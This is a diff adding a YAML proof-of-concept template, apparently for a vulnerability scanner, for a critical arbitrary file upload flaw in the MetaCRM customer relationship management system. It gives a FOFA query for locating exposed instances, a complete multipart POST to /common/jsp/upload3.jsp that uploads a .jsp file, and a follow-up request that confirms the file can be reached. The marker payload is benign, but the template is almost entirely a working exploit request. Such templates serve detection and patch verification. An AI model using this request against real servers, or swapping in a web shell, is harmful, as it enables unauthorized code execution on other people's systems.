@@ -1,0 +1,75 @@
+id: poc-yaml-meta-crm-commonjspupload3-anyfile-upload
+info:
+  name: MetaCRM客户关系管理系统 commonjspupload3 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: MetaCRM客户关系管理系统
+  fofa: body="/common/scripts/basic.js"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /common/jsp/upload3.jsp?key=file&form=formdata&field=attach_name_1&filetitle=attach_title_1&folder=null&relativepath=null&%3E
+  headers:
+    Content-Type: multipart/form-data; boundary=----geckoformboundaryc4e5992e491182d9864532ef66356073
+  data: '------geckoformboundaryc4e5992e491182d9864532ef66356073
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    {{.t2}}
+
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+
+    Content-Disposition: form-data; name="key"
+
+
+    file
+
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+
+    Content-Disposition: form-data; name="form"
+
+
+    formdata
+
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+
+    Content-Disposition: form-data; name="field"
+
+
+    attach_name_1
+
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+
+    Content-Disposition: form-data; name="filetitile"
+
+
+    attach_title_1
+
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+
+    Content-Disposition: form-data; name="filefolder"
+
+
+    null
+
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073
+
+    Content-Disposition: form-data; name="relativepath"
+
+
+    null
+
+    ------geckoformboundaryc4e5992e491182d9864532ef66356073--'
+  expression: status_code == 200 && contains(body,".jsp")
+  output:
+  - regex_match(body,"/userfile/default/temp/(?P<file>.*?).jsp")
+- method: GET
+  path: /userfile/default/temp/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
